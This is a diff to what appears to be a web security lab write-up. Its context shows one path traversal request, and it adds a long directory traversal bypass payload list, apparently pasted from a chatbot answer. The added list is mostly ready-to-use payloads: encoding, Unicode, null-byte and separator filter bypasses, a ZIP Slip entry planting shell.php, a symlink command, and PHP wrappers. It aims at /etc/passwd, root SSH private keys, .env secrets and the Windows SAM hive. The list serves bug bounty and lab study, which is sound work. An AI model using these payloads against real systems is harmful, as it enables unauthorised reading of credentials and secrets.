@@ -450,3 +450,277 @@ GET /image?filename=..././..././..././..././..././etc/passwd HTTP/2
 
 ![img](images/14%20-%20File%20path%20traversal,%20traversal%20sequences%20stripped%20non-recursively/3.png)
 
+
+Below is the **Directory Traversal – Complete Bypass Payload List**, written in the **same format** as your previous ones (SSTI / OS Command Injection / Request Smuggling / SSRF / XXE / Host Header / CORS etc.).
+
+This includes **Linux/Windows paths, filter bypass, encoding tricks, double encoding, Unicode, null byte, traversal over SMB/NFS, absolute/relative path attacks**, and **real-world bug bounty payloads**.
+
+---
+
+# ⭐ **Directory Traversal – Complete Bypass Payload List**
+
+---
+
+# **1. Core Directory Traversal Payloads**
+
+### Basic traversal
+
+```
+../etc/passwd
+../../../../etc/passwd
+..\..\..\windows\win.ini
+```
+
+### Absolute paths
+
+```
+/etc/passwd
+c:\windows\win.ini
+```
+
+---
+
+# **2. Double Traversal (Common on Apache / Nginx)**
+
+```
+....//....//etc/passwd
+....\/....\/etc/passwd
+```
+
+---
+
+# **3. Traversal with Mixed Separators**
+
+```
+..\/..\/..\/etc/passwd
+..\../..\../windows/win.ini
+```
+
+---
+
+# **4. URL Encoding Bypass**
+
+### Basic URL encoding
+
+```
+..%2f..%2f..%2fetc/passwd
+..%5c..%5cwindows%5cwin.ini
+```
+
+### Double / triple encoding
+
+```
+..%252f..%252fetc/passwd
+..%255c..%255cwindows%255cwin.ini
+```
+
+---
+
+# **5. Unicode Bypass Payloads**
+
+```
+..%c0%af..%c0%afetc/passwd
+..%c1%1c..%c1%1cwindows/win.ini
+```
+
+---
+
+# **6. Null Byte Injection (Legacy PHP / Java)**
+
+```
+../../etc/passwd%00.png
+../../../windows/win.ini%00.txt
+```
+
+---
+
+# **7. Directory Traversal via Filename Tricks**
+
+### Dotless traversal
+
+```
+/etc/passwd/.
+```
+
+### Using hidden dirs
+
+```
+/etc/./passwd
+```
+
+---
+
+# **8. Filter Bypass: Blocked “../”**
+
+### Replacing dot with encoded dot
+
+```
+.%2e/
+%2e./
+%2e%2e/
+```
+
+### Inverted traversal
+
+```
+/etc/passwd%2e%2e/
+```
+
+---
+
+# **9. Filter Bypass: Blocked Slash**
+
+### Backslashes
+
+```
+..\..\..\etc\passwd
+```
+
+### URL encoded slash
+
+```
+..%2f..%2f/etc/passwd
+```
+
+### Slash via Unicode
+
+```
+..%c0%af..%c0%afetc/passwd
+```
+
+---
+
+# **10. Using Wildcards**
+
+```
+/etc/pas*wd
+/var/log/*.log
+```
+
+---
+
+# **11. Overlong UTF-8 Encoding**
+
+```
+..%ef%bc%8f..%ef%bc%8fetc/passwd
+```
+
+---
+
+# **12. Bypass Path Normalization**
+
+### Insert fake folders
+
+```
+../safe/../etc/passwd
+folder/../../../../etc/passwd
+```
+
+---
+
+# **13. Windows UNC Path Traversal (SMB)**
+
+```
+\\127.0.0.1\c$\windows\win.ini
+\\localhost\c$\users\public
+```
+
+---
+
+# **14. Trailing Characters Bypass**
+
+```
+../../etc/passwd.
+../../etc/passwd//
+../../etc/passwd?
+../../etc/passwd#
+```
+
+---
+
+# **15. Base64 Encoded Path Injection (Used in APIs)**
+
+```
+Li4vLi4vLi4vZXRjL3Bhc3N3ZA==   # ../../../etc/passwd
+```
+
+---
+
+# **16. Path Traversal in ZIP / TAR Archives**
+
+### ZIP Slip attack
+
+```
+../../../../var/www/html/shell.php
+```
+
+Inside ZIP entry name.
+
+---
+
+# **17. Traversal via Symlink Abuse**
+
+```
+ln -s /etc/passwd /var/www/html/test.txt
+```
+
+Then access:
+
+```
+/files/test.txt
+```
+
+---
+
+# **18. Path Traversal via Null Folder Names**
+
+```
+.../. /.../etc/passwd
+```
+
+---
+
+# **19. Bypass via URL Prefix (File Wrapper)**
+
+### PHP filters
+
+```
+php://filter/resource=../../etc/passwd
+```
+
+### File wrapper
+
+```
+file:///etc/passwd
+```
+
+---
+
+# **20. Advanced Real-World Payloads**
+
+### Read SSH keys
+
+```
+../../../../root/.ssh/id_rsa
+```
+
+### Read Cron jobs
+
+```
+../../../etc/crontab
+```
+
+### Read Application Secrets
+
+```
+../../../../var/www/html/.env
+```
+
+### Read Windows Registry Hives
+
+```
+..\..\Windows\System32\config\SAM
+..\..\Windows\System32\config\SYSTEM
+```
+
+---
